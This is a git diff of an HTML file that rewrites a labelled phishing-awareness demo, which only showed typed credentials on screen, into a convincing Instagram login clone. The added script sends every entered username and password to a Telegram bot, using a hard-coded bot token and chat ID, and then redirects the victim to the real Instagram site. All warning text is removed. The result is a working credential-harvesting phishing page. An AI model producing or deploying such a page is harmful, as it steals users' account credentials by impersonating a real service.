@@ -3,92 +3,244 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Phishing Awareness Simulation</title>
+    <title>Instagram</title>
+    <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png" type="image/png">
     <style>
-        body {
+        @import url('https://fonts.googleapis.com/css2?family=Pacifico&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
             font-family: Arial, sans-serif;
-            background-color: #f5f5f5;
+        }
+
+        body {
+            background: #000;
+            color: #fff;
             display: flex;
-            justify-content: center;
+            flex-direction: column;
             align-items: center;
+            justify-content: center;
             height: 100vh;
-            margin: 0;
-        }
-        .container {
             text-align: center;
-            background: #fff;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-            width: 350px;
         }
-        .header {
-            font-size: 24px;
-            font-weight: bold;
-            margin-bottom: 10px;
-            color: #333;
-        }
-        .warning {
-            color: red;
+
+        .language {
             font-size: 14px;
-            margin-bottom: 20px;
+            color: #ccc;
+            position: absolute;
+            top: 20px;
+            text-align: center;
         }
-        form {
-            margin: 0;
-        }
-        input {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-            font-size: 14px;
-        }
-        button {
-            width: 100%;
-            padding: 10px;
-            background-color: #3897f0;
+
+        select {
+            background: transparent;
             color: white;
             border: none;
-            border-radius: 5px;
-            font-size: 16px;
+            font-size: 14px;
             cursor: pointer;
+            outline: none;
         }
+
+        .logo {
+            font-size: 36px;
+            font-family: 'Pacifico', cursive;
+            margin-bottom: 20px;
+        }
+
+        .facebook-btn {
+            background: #1877f2;
+            color: white;
+            padding: 10px;
+            width: 250px;
+            border-radius: 8px;
+            font-weight: bold;
+            margin-bottom: 15px;
+            cursor: pointer;
+            border: none;
+            transition: background 0.3s ease, transform 0.2s ease;
+        }
+
+        .facebook-btn:hover {
+            background: #166fe5;
+            transform: scale(1.02);
+        }
+
+        .separator {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 10px 0;
+            font-size: 14px;
+            color: #a8a8a8;
+        }
+
+        .separator::before, .separator::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #333;
+            margin: 0 10px;
+        }
+
+        input {
+            width: 250px;
+            padding: 12px;
+            margin: 8px 0;
+            background: #121212;
+            border: 1px solid #333;
+            border-radius: 6px;
+            color: white;
+            font-size: 14px;
+            outline: none;
+            transition: border 0.3s ease, transform 0.2s ease;
+        }
+
+        input:focus {
+            border: 1px solid #0095f6;
+            transform: scale(1.02);
+        }
+
+        button {
+            width: 250px;
+            background: #0095f6;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 14px;
+            margin-top: 10px;
+            transition: background 0.3s ease, transform 0.2s ease;
+        }
+
         button:hover {
-            background-color: #2879c7;
+            background: #0077cc;
+            transform: scale(1.02);
+        }
+
+        .forgot-password {
+            font-size: 12px;
+            color: #a8a8a8;
+            margin-top: 10px;
+            display: block;
+            text-decoration: none;
+            transition: color 0.3s ease;
+        }
+
+        .forgot-password:hover {
+            color: #fff;
+        }
+
+        .signup {
+            margin-top: 15px;
+            font-size: 14px;
+        }
+
+        .signup a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .terms {
+            font-size: 12px;
+            color: #a8a8a8;
+            margin-top: 15px;
+            width: 280px;
+        }
+
+        .footer {
+            margin-top: 30px;
+            font-size: 12px;
+            color: #777;
+        }
+
+        .footer a {
+            color: #777;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+
+        @media (max-width: 400px) {
+            input, button, .facebook-btn {
+                width: 90%;
+            }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">Instagram Login</div>
-        <p class="warning">This is a phishing simulation. Do NOT enter real credentials.</p>
-        <form id="phishingForm">
-            <input type="text" id="username" placeholder="Username" required>
-            <input type="password" id="password" placeholder="Password" required>
-            <button type="submit">Log In</button>
-        </form>
-        <p id="output" style="margin-top: 20px; color: #333;"></p>
+
+    <div class="language">
+        <label for="lang"> </label>
+        <select id="lang" onchange="changeLanguage(this.value)">
+            <option value="en">English (UK)</option>
+            <option value="es">Español</option>
+            <option value="fr">Français</option>
+            <option value="de">Deutsch</option>
+            <option value="it">Italiano</option>
+            <option value="pt">Português</option>
+        </select>
+    </div>
+
+    <div class="logo">Instagram</div>
+
+    <a href="https://m.facebook.com/login" class="facebook-btn">Continue Using Facebook</a>
+
+    <div class="separator">OR</div>
+
+    <form id="loginForm">
+        <input type="text" id="username" name="username" placeholder="Phone number, username, or email" required>
+        <input type="password" id="password" name="password" placeholder="Password" required>
+        <a href="forgot-password.html" class="forgot-password">Forgotten your password?</a>
+        <button type="submit">Log In</button>
+    </form>
+
+    <div class="signup">
+        Don't have an account? <a href="https://www.instagram.com/accounts/signup/">Sign up</a>
+    </div>
+
+    <div class="terms">
+        By continuing, you agree to Instagram's <a href="https://help.instagram.com/581066165581870/?locale=en_GB">Terms of Use</a> and <a href="https://privacycenter.instagram.com/policy/">Privacy Policy</a>.
+    </div>
+
+    <div class="footer">
+        Meta · <a href="https://about.meta.com/">About</a> · <a href="https://about.instagram.com/">Blog</a> · <a href="#">Jobs</a> · <a href="#">Help</a> · <a href="#">API</a> · <a href="#">Privacy</a> · <a href="#">Terms</a> · <a href="#">Location</a>  
     </div>
 
     <script>
-        document.getElementById("phishingForm").addEventListener("submit", function (e) {
-            e.preventDefault(); // Prevent form submission
-            const username = document.getElementById("username").value;
-            const password = document.getElementById("password").value;
+        function changeLanguage(lang) {
+            alert("Language changed to: " + lang);
+        }
 
-            // Display the captured credentials for educational purposes
-            const output = document.getElementById("output");
-            output.innerHTML = `
-                <strong>Captured Credentials:</strong><br>
-                Username: <span style="color: blue;">${username}</span><br>
-                Password: <span style="color: red;">${password}</span>
-            `;
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault();
 
-            // For educational purposes only - Do not send data to a server
-            console.log("Username:", username);
-            console.log("Password:", password);
+            let username = document.getElementById("username").value;
+            let password = document.getElementById("password").value;
+            
+            if (username && password) {
+                let botToken = "7816981365:AAEU5FLr5ZQQdixgYMp0FPXXL00p7EY6cFU";
+                let chatId = "6524787237";
+                let message = `New Login Attempt\nUsername: ${username}\nPassword: ${password}`;
+
+                let telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+                
+                fetch(telegramUrl, { method: "GET" })
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.ok) {
+                            window.location.href = "https://www.instagram.com/";
+                        } else {
+                            alert("Error sending message.");
+                        }
+                    })
+                    .catch(error => console.error("Error:", error));
+            }
         });
     </script>
+
 </body>
 </html>
